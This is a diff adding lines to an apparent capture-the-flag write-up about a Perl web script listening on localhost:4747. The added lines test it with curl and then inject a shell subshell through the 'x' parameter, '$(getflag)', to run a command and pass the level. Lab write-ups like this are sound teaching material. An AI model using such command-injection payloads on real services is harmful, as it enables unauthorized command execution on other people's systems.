@@ -30,3 +30,16 @@ sub x {
 x(param("x")); # call x with parameter x - http
 ```
 
+We can try it with:
+```shell
+curl 'localhost:4747?x=toto'
+```
+It print toto
+
+
+We can inject a subshell like this:
+```shell
+curl 'localhost:4747?x=$(getflag)'
+```
+
+It give us the getflag result, who allows us to pass to the next level, it work !
